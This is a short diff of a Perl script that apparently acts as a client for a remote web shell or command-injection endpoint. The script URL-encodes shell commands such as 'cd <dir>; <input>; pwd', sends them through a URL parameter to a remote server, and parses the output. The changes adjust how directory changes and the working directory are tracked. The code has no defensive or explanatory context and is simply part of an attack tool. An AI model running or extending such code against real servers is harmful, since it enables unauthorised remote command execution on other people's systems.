@@ -62,7 +62,7 @@ sub cd{
         URLEncode($input);
         my $encpwd=$pwd;
         URLEncode($encpwd);
-	$pwd = `$curl=%63%64%20$encpwd%3B$input%202%3E%261`;
+	$pwd = `$curl=%63%64%20$encpwd%3B$input%3B%70%77%64`;
 	StripTags($pwd);
 	$pwd =~ s/^\s+|\s+$//g;	
 }
@@ -214,7 +214,6 @@ sub shell{
         if ($debug){print "debug: $curl=%63%64%20$encpwd%3B$input%202%3E%261\n";}
 	foreach my $cmd (@parts){
 		if ($cmd =~ m/cd \S+/){
-			$cmd =~ s/ /%20/g;
 			cd($cmd);
 		}
 	}
